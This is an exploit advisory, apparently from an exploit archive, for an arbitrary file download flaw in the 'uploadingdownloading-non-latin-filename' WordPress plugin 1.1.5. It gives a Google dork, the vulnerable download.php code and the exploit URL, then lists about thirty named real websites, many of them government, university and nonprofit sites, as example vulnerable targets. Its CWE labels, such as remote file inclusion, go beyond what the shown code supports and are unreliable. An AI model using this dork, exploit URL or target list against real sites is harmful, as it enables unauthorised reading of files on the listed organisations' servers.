#################################################################################################

# Exploit Title : WordPress uploadingdownloading-non-latin-filename Plugins
1.1.5 Arbitrary File Download Vulnerability
# Author [ Discovered By ] : KingSkrupellos from Cyberizm Digital Security
Army
# Date : 29/11/2018
# Vendor Homepage :
wordpress.org/plugins/uploadingdownloading-non-latin-filename/
# Software Download Link :
downloads.wordpress.org/plugin/uploadingdownloading-non-latin-filename.1.1.5.zip
# Tested On : Windows and Linux
# Category : WebApps
# Version Information : From 1.02 to 1.1.5 / All Current Versions
# Google Dorks :
inurl:''/wp-content/plugins/uploadingdownloading-non-latin-filename/''
# Exploit Risk : Medium
# Exact Vulnerable Version Information : 1.1.5
# Vulnerability Type :
CWE-264 - [ Permissions, Privileges, and Access Controls ]
CWE-200 - [ Information Exposure ] - CWE-23 - [ Relative Path Traversal ]
CWE-98 - [ Improper Control of Filename for Include/Require Statement in
PHP Program ('PHP Remote File Inclusion') ]

#################################################################################################

WordPress uploadingdownloading-non-latin-filename Plugins is prone to a
vulnerability that lets attackers to download

arbitrary files because the application fails to sufficiently sanitize
user-supplied input.

An attacker can exploit this issue to download arbitrary files within the
context of the webserver process.

The attacker can download and read all files known by the name via 'id'
parameter.

Information obtained may aid in further attacks.

#################################################################################################

Vulnerability File PHP Code :  /download.php

<?php
if( ! isset($_GET['id']) or empty($_GET['id'])){
    echo "error! enter attachment ID!";
    exit;
}

include '../../../wp-blog-header.php';
include 'Browser/lib/Browser.php';

$filename_for_download = nlf_get_filename_for_download($_GET['id']);

$attachment = get_post($_GET['id']);
$attachment_meta = get_post_meta($_GET['id']);
$upload_dir = wp_upload_dir();

$original_filepath = $upload_dir['basedir'] . '/' .
$attachment_meta['_wp_attached_file'][0];

$browser = new Browser();

if(
$browser->getBrowser() == Browser::BROWSER_IE
){
    $filename_encoded = rawurlencode($filename_for_download);
}else{
$filename_encoded = $filename_for_download;
}

status_header(200);
header('cache-control: no-cache');
header('Content-type: ' . $attachment->post_mime_type);
header("Content-Disposition: attachment; filename=" . $filename_encoded);

// orifinal file
readfile($original_filepath);

#################################################################################################

# Admin Panel Login Path :

/wp-login.php

# Vulnerability Error :

error! enter attachment ID!

# Exploit :

/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]

#################################################################################################

# Example Vulnerable Sites =>

[+]
ppf.gov.iq/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://ppf.gov.iq/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
pel.smuc.ac.kr/~cisc2017s/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://pel.smuc.ac.kr/~cisc2017s/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
szupu.szu.edu.cn/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://szupu.szu.edu.cn/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
tdlshop.in/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://tdlshop.in/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
meditationedu.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://meditationedu.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
appbiz.seoul.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://appbiz.seoul.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
gwangjufolly.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://gwangjufolly.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
technician.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://technician.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
doc.arch.mju.ac.th/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://doc.arch.mju.ac.th/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
dft.cute.edu.tw/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://dft.cute.edu.tw/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
119.gg.go.kr/north/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://119.gg.go.kr/north/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
research.beautifulfund.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://research.beautifulfund.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
svenskjakt.se/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://svenskjakt.se/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
ilmin.org/kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://ilmin.org/kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
architecture.kunsan.ac.kr/mchangho/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://architecture.kunsan.ac.kr/mchangho/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
blog.solarview.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://blog.solarview.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
womenfund.or.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://womenfund.or.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
gwangjufolly.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://gwangjufolly.org/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
cisp.or.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://cisp.or.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
risingx.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://risingx.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
tigersw.com/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://tigersw.com/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
sehub.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://sehub.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
missionbridge.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://missionbridge.net/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
startup.kaist.ac.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://startup.kaist.ac.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
ericaiie.hanyang.ac.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://ericaiie.hanyang.ac.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
ganaart.com/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://ganaart.com/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
health.re.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://health.re.kr/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
hosting01.snu.ac.kr/~linguist/cwp/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://hosting01.snu.ac.kr/~linguist/cwp/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
hukobio.co.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://hukobio.co.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
dasreich.myqnapcloud.com/kfz222wp/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://dasreich.myqnapcloud.com/kfz222wp/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
womenfund.or.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://womenfund.or.kr/wordpress/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

[+]
juul-nielsen.dk/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[FAdegLENAMEHERE]
<http://juul-nielsen.dk/wp-content/plugins/uploadingdownloading-non-latin-filename/download.php?id=[F%C4%B0LENAMEHERE]>

#################################################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team

#################################################################################################
